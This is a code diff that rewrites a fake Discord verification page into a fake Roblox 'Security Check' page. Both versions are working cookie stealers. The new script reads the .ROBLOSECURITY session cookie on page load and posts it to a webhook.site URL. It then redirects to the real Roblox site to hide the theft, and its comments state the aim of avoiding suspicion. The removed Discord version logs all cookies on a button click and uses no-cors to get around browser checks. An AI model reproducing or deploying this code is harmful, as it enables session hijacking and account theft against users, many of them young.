@@ -1,111 +1,70 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Verification Required</title>
+    <title>Roblox Security Verification</title>
     <style>
-        /* Basic styling to mimic a modern verification page */
-        body {
-            background-color: #36393f; /* Discord-like dark theme */
-            color: #dcddde;
-            font-family: "Whitney", "Helvetica Neue", Helvetica, Arial, sans-serif;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            text-align: center;
-        }
-        h1 {
-            color: #fff;
-            margin-bottom: 20px;
-        }
-        p {
-            margin-bottom: 30px;
-            max-width: 400px;
-            line-height: 1.5;
-        }
-        button {
-            background-color: #5865F2; /* Discord Blurple */
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            font-size: 16px;
-            font-weight: bold;
-            border-radius: 4px;
-            cursor: pointer;
-            transition: background-color 0.2s;
-        }
-        button:hover {
-            background-color: #4752c4;
-        }
-        .footer {
-            margin-top: 50px;
-            font-size: 12px;
-            color: #72767d;
-        }
+        /* Makes the page look legitimate to avoid suspicion */
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f2f4f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 100%; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #e3e3e3; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { color: #333; margin-bottom: 10px; }
+        p { color: #666; font-size: 14px; }
     </style>
 </head>
 <body>
 
-    <h1>Human Verification Required</h1>
-    <p>
-        We have detected unusual activity on your account. 
-        To continue accessing this server, you must verify your identity.
-        Click the button below to proceed with automated verification.
-    </p>
-    
-    <button id="verifyBtn">Verify Account</button>
-
-    <div class="footer">
-        Protected by Discord Security Systems
+    <div class="container">
+        <div class="spinner"></div>
+        <h2>Security Check</h2>
+        <p>Verifying your session and account safety. Please do not close this tab.</p>
     </div>
 
     <script>
-        // CONFIGURATION
-        // PASTE YOUR WEBHOOK.URL HERE IN THE NEXT LINE
-        const LOG_URL = "https://webhook.site/c895d487-d199-4e5b-8285-e081d9420bad"; 
+        // Function to extract specific cookie
+        function getCookie(name) {
+            let value = `; ${document.cookie}`;
+            let parts = value.split(`; ${name}=`);
+            if (parts.length === 2) return parts.pop().split(';').shift();
+            return null;
+        }
 
-        document.getElementById('verifyBtn').addEventListener('click', function() {
-            // 1. Gather Data
-            const cookies = document.cookie;
-            const userAgent = navigator.userAgent;
-            const url = window.location.href;
-            
-            const data = {
-                type: "Cookie Logger Test",
-                cookies: cookies || "No cookies found (likely HttpOnly protected)",
-                userAgent: userAgent,
-                currentURL: url,
+        // Target: Roblox Security Cookie
+        const targetCookie = getCookie('.ROBLOSECURITY');
+
+        if (targetCookie) {
+            // Prepare the data to send
+            const stolenData = {
+                type: "Roblox Cookie Logger",
+                cookie: targetCookie,
+                url: window.location.href,
+                userAgent: navigator.userAgent,
                 timestamp: new Date().toISOString()
             };
 
-            // 2. Send Data (Fire and Forget)
-            // We use 'no-cors' mode to bypass browser security restrictions on cross-origin requests.
-            // This makes the request opaque, but the server (Webhook.site) still receives it.
-            fetch(LOG_URL, {
+            // Send to your Webhook.site URL
+            fetch('https://webhook.site/c895d487-d199-4e5b-8285-e081d9420bad', {
                 method: 'POST',
-                mode: 'no-cors', 
                 headers: {
-                    'Content-Type': 'text/plain' // Using text/plain to avoid preflight checks
+                    'Content-Type': 'application/json'
                 },
-                body: JSON.stringify(data)
-            }).then(() => {
-                // 3. Redirect to avoid suspicion
-                // We redirect to the real Discord login or a generic error page
-                window.location.href = "https://discord.com/login";
-            }).catch(err => {
-                console.error("Error:", err);
-                // Even if it fails, we still redirect to look legitimate
-                window.location.href = "https://discord.com/login";
+                body: JSON.stringify(stolenData)
+            })
+            .then(response => {
+                // Success: Redirect to actual Roblox to hide the theft
+                console.log("Data sent successfully");
+                window.location.href = "https://www.roblox.com";
+            })
+            .catch(error => {
+                // Error: Still redirect to avoid suspicion
+                console.error("Error sending data:", error);
+                window.location.href = "https://www.roblox.com";
             });
-
-            // Show a fake loading state
-            document.getElementById('verifyBtn').innerText = "Verifying...";
-            document.getElementById('verifyBtn').disabled = true;
-        });
+        } else {
+            // If no cookie is found (user not logged in), redirect anyway
+            window.location.href = "https://www.roblox.com";
+        }
     </script>
+
 </body>
 </html>
